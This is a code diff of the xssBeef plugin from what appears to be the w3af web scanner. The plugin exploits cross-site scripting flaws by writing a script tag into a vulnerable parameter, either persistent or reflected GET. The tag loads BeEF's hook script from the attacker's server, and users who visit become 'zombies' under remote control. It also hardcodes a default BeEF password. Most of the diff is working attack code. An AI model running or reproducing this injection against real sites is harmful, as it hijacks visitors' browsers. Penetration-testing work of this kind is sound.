@@ -21,15 +21,19 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 '''
 
 
-from core.data.fuzzer.fuzzer import *
 import core.controllers.outputManager as om
+
 from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
-import core.data.kb.knowledgeBase as kb
 import core.data.parsers.urlParser as urlParser
 from core.controllers.w3afException import w3afException
+
+import core.data.kb.knowledgeBase as kb
+from core.data.kb.shell import shell as shell
+
 # options
 from core.data.options.option import option
 from core.data.options.optionList import optionList
+
 
 class xssBeef(baseAttackPlugin):
     '''
@@ -40,12 +44,17 @@ class xssBeef(baseAttackPlugin):
     def __init__(self):
         baseAttackPlugin.__init__(self)
         
+        # Internal variables
+        self._vuln = None
+        
         # User configured variables
-        self._beefPasswd = ''
-        self._beefURL = 'http://localhost/beef/'        # without the hook dir !
+        self._beefPasswd = 'BeEFConfigPass'
+        # without the hook dir !
+        self._beefURL = 'http://localhost/beef/'
         
         # A message to the user
-        self._message = 'You can start interacting with the beEF server at: ' + urlParser.urlJoin( self._beefURL, 'ui/' )
+        self._message = 'You can start interacting with the beEF server at: '
+        self._message += urlParser.urlJoin( self._beefURL, 'ui/' )
         
     def fastExploit(self, url, method, data ):
         '''
@@ -56,7 +65,7 @@ class xssBeef(baseAttackPlugin):
         @parameter data: A string containing data to send with a mark that defines
         which is the vulnerable parameter ( aa=notMe&bb=almost&cc=[VULNERABLE] )
         '''
-        return self._shell
+        return None
     
     def getAttackType(self):
         '''
@@ -75,98 +84,115 @@ class xssBeef(baseAttackPlugin):
         return 'osCommanding' in this method.
         '''        
         return 'xss'
-                
+
     def exploit( self, vulnToExploit=None ):
         '''
         Exploits a XSS vuln that was found and stored in the kb.
 
         @return: True if the shell is working and the user can start calling rexec
         '''
-        om.out.information( 'Browser Exploitation Framework - by Wade Alcorn http://www.bindshell.net' )
-        xssVulns = kb.kb.getData( 'xss' , 'xss' )
+        om.out.console( 'Browser Exploitation Framework - by Wade Alcorn http://www.bindshell.net' )
+        xss_vulns = kb.kb.getData( 'xss' , 'xss' )
         if not self.canExploit():
             raise w3afException('No cross site scripting vulnerabilities have been found.')
         
-        # First I'll configure the beef server, if this is unsuccessfull, then nothing else should be done!
-        # POST http://localhost/beef/submit_config.php?config=http://localhost/beef/&passwd=beEFconfigPass HTTP/1.1
-        configURL = urlParser.urlJoin( self._beefURL , 'submit_config.php' )
-        configURI = configURL + '?config=' + self._beefURL + '&passwd=' + self._beefPasswd
-        response = self._urlOpener.GET( configURI )
+        # First I'll configure the beef server, if this is unsuccessfull, then nothing else 
+        # should be done!
+        #
+        # GET http://localhost/beef/submit_config.php?config=http://localhost/beef/&passwd=
+        #beEFconfigPass HTTP/1.1
+        config_URL = urlParser.urlJoin( self._beefURL , 'submit_config.php' )
+        config_URI = config_URL + '?config=' + self._beefURL + '&passwd=' + self._beefPasswd
+        response = self._urlOpener.GET( config_URI )
         if response.getBody().count('BeEF Successfuly Configured'):
             # everything ok!
             pass
-        elif response.getBody().count('Incorrect beEF password, please try again.'):
+        elif 'Incorrect BeEF password, please try again.' in response.getBody():
             raise w3afException('Incorrect password for beEF configuration.')
+        elif 'Permissions on the' in response.getBody():
+            raise w3afException('Incorrect BeEF installation')
         else:
             raise w3afException('BeEF installation not found.')
             
         
         # Try to get a proxy using one of the vulns
-        for vuln in xssVulns:
-            om.out.information('Trying to exploit using vulnerability with id: ' + str( vuln.getId() ) )
-            if self._generateProxy(vuln):
+        for vuln_obj in xss_vulns:
+            msg = 'Trying to exploit using vulnerability with id: ' + str( vuln_obj.getId() )
+            om.out.console( msg )
+            if self._generateProxy(vuln_obj):
                 # A proxy was generated, I only need one point of xss
-                om.out.information('Successfully exploited XSS using vulnerability with id: ' + str( vuln.getId() ) )
-                return True
-            else:
-                om.out.information('Failed to exploit using vulnerability with id: ' + str( vuln.getId() ) )
-                    
-        return False
+                msg = 'Successfully exploited XSS using vulnerability with id: '
+                msg += str( vuln_obj.getId() )
+                om.out.console( msg )
                 
-    def _generateProxy( self, vuln ):
+                # Create the shell object
+                shell_obj = xssShell(vuln_obj)
+                shell_obj.setBeefURL( self._beefURL )
+                kb.kb.append( self, 'shell', shell_obj )
+                
+                return [ shell_obj, ]
+            else:
+                msg = 'Failed to exploit using vulnerability with id: ' + str( vuln_obj.getId() )
+                om.out.console( msg )
+                    
+        return []
+                
+    def _generateProxy( self, vuln_obj ):
         '''
-        @parameter vuln: The vuln to exploit.
+        @parameter vuln_obj: The vuln to exploit.
         @return: True is a proxy could be established using the vuln parameter.
         '''
         # Check if we really can contact the remote beef install
-        if self._verifyVuln( vuln ):
-            self._vuln = vuln
+        if self._verifyVuln( vuln_obj ):
+            self._vuln = vuln_obj
             return True
         else:
             return False
 
-    def _verifyVuln( self, vuln ):
+    def _verifyVuln( self, vuln_obj ):
         '''
         This command verifies a vuln. This is really hard work! :P
 
+        @parameter vuln_obj: The vulnerability to exploit.
         @return : True if vuln can be exploited.
         '''
         # Internal note:
         # <script language="Javascript" src="http://localhost/beef/hook/beefmagic.js.php"></script>
-        toInclude = '<script language="Javascript" src="' + urlParser.urlJoin( self._beefURL, 'hook/beefmagic.js.php' ) + '"></script>'
-        if vuln['escapesDouble'] and not vuln['escapesSingle']:
-            toInclude = toInclude.replace('"', "'")
-            
-        if not ( vuln['escapesSingle'] and vuln['escapesDouble'] ) and not vuln['escapesLtGt']:
-            # We are almost there...
-            if 'permanent' in vuln.keys():
-                # Its a permanent / persistant XSS, nice ! =)
-                m = vuln['oldMutant']
-                m.setModValue( toInclude )
-                # Write the XSS
-                response = self._sendMutant( m, analyze=False )
-                # Read it !
-                response = self._sendMutant( vuln.getMutant(), analyze=False )
-                if response.getBody().count( toInclude ):
-                    om.out.console('The exploited cross site scripting is of type permanent. To be activated, the zombies should navigate to: ' + vuln.getMutant().getURI() )
+        to_include = '<script language="Javascript" src="' 
+        to_include += urlParser.urlJoin( self._beefURL, 'hook/beefmagic.js.php' ) + '"></script>'
+        
+        if 'permanent' in vuln_obj.keys():
+            # Its a permanent / persistant XSS, nice ! =)
+            write_payload_mutant = vuln_obj['write_payload']
+            write_payload_mutant.setModValue( to_include )
+            # Write the XSS
+            response = self._sendMutant( write_payload_mutant, analyze=False )
+            # Read it !
+            response = self._sendMutant( vuln_obj.getMutant(), analyze=False )
+            if to_include in response.getBody():
+                msg = 'The exploited cross site scripting is of type permanent. To be activated,'
+                msg += ' the zombies should navigate to: ' + vuln_obj.getMutant().getURI()
+                om.out.console( msg )
+                om.out.console( self._message )
+                return True
+            else:
+                return False
+                        
+        else:
+            # Its a simple xss
+            if vuln_obj.getMethod() == 'GET':
+                # I'll be able to exploit this one.
+                mutant = vuln_obj.getMutant()
+                mutant.setModValue( to_include )
+                response = self._sendMutant( mutant, analyze=False )
+                if to_include in response.getBody():
+                    msg = 'To be activated, the zombies have to navigate to: "'
+                    msg += mutant.getURI() + '".'
+                    om.out.console( msg )
                     om.out.console( self._message )
                     return True
                 else:
                     return False
-                        
-            else:
-                # Its a simple xss
-                if vuln.getMethod() == 'GET':
-                    # I'll be able to exploit this one.
-                    m = vuln.getMutant()
-                    m.setModValue( toInclude )
-                    response = self._sendMutant( m, analyze=False )
-                    if response.getBody().count( toInclude ):
-                        om.out.console('To be activated, the zombies should navigate to: ' + m.getURI() )
-                        om.out.console( self._message )
-                        return True
-                    else:
-                        return False
     
     def rexec( self, command ):
         '''
@@ -178,7 +204,8 @@ class xssBeef(baseAttackPlugin):
         '''
         @return: A list of option objects for this plugin.
         '''
-        d1 = 'This is the location that the zombies will connect to (do not include the hook directory)'
+        d1 = 'This is the location that the zombies will connect to (do not include the'
+        d1 += ' hook directory)'
         h1 = 'This is configuration is directly passed to beEF XSS exploitation framework.'
         o1 = option('beefURL', self._beefURL, d1, 'string', help=h1)
         
@@ -239,3 +266,26 @@ class xssBeef(baseAttackPlugin):
             - After running this plugin you have to infect other users with the URL provided by w3af
             - You have to open a browser and point it to your beef installation in order to manage zombies
         '''
+        
+class xssShell(shell):
+    def _rexec( self, command ):
+        msg = 'TODO: Code some commands here. For now, just execute endInteraction'
+        msg += ' (this won\'t close BeEF)'
+        return msg
+        
+    def setBeefURL(self, beef_url):
+        self._beefURL = beef_url
+    
+    def end( self ):
+        om.out.debug('xssShell cleanup complete.')
+        
+    def getName( self ):
+        return 'xss_shell'
+    
+    def _identifyOs(self):
+        return 'xss'
+        
+    def __repr__( self ):
+        return '<'+self.getName()+' object (Browse to: "'+self._beefURL+'")>'
+        
+    __str__ = __repr__
